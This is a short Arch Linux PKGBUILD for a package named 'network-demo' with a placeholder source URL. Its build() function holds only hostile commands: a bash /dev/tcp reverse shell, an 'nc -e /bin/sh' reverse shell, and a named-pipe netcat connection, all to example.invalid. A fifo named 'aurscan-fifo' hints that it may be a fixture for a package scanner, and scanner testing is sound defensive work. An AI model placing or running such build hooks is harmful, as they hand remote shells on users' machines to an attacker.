pkgname=network-demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/network-demo"
source=("https://example.invalid/network-demo.tar.gz")
sha256sums=('b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184')

build() {
  bash -i >& /dev/tcp/example.invalid/4444 0>&1
  nc -e /bin/sh example.invalid 4444
  mkfifo /tmp/aurscan-fifo
  nc example.invalid 4445 < /tmp/aurscan-fifo
}
